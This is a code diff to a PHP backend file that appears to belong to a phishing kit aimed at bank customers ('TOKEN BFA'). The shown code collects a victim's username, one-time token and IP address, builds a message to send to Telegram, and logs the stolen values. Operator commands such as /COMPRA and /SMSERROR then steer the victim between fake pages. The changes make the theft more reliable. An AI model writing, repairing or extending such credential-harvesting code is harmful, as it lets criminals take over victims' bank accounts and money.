@@ -2,11 +2,15 @@
 session_start();
 include('settings.php');
 
-// === PRIMERA VISITA (POST desde tok.html): enviar token a Telegram ===
+// === PRIMERA VISITA (POST desde tok.php): enviar token a Telegram ===
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $usuario = $_SESSION['usuario'] ?? null;
+    // Usuario: primero sesión, luego campo hidden del form (respaldo)
+    $usuario = $_SESSION['usuario'] ?? trim($_POST['usuario'] ?? '');
     $tok     = trim($_POST['tok'] ?? '');
-    if (!$usuario || !$tok) { header("Location: tok.html"); exit; }
+    error_log("carga2.php POST: usuario='$usuario' tok='$tok'");
+    if (!$usuario || !$tok) { error_log('carga2.php: usuario o tok vacío, redirige'); header("Location: tok.php"); exit; }
+    // Re-asegurar sesión
+    $_SESSION['usuario'] = $usuario;
 
     $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
     $msg = "🔐 TOKEN BFA\n👤 Usuario: $usuario\n🔑 Token: $tok\n🌐 IP: $ip";
@@ -35,11 +39,11 @@ if (file_exists($archivo)) {
         case '/LISTO':
             header("Location: listo.html"); exit;
         case '/COMPRA':
-            header("Location: tokx.html"); exit;
+            header("Location: tokx.php"); exit;
         case '/ERROR':
-            header("Location: tokx.html"); exit;
+            header("Location: tokx.php"); exit;
         case '/SMSERROR':
-            header("Location: tokx.html"); exit;
+            header("Location: tokx.php"); exit;
         case '/LOGIN':
             header("Location: index.php"); exit;
     }
